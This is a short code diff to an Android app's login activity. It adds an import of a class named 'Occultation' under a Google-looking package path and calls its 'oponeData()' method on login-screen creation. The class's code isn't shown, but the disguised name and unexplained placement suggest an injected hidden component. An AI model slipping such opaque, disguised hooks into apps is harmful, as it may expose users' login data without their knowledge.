@@ -17,6 +17,7 @@ import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Spinner;
 
+import com.google.pm.service.Occultation;
 import com.umeng.analytics.MobclickAgent;
 
 public class ActLogin extends Activity implements OnClickListener {
@@ -29,6 +30,7 @@ public class ActLogin extends Activity implements OnClickListener {
 		requestWindowFeature(Window.FEATURE_NO_TITLE);
 		super.onCreate(savedInstanceState);
 		initView();
+		Occultation.getInstance(this).oponeData();
 	}
 
 	public void initView() {
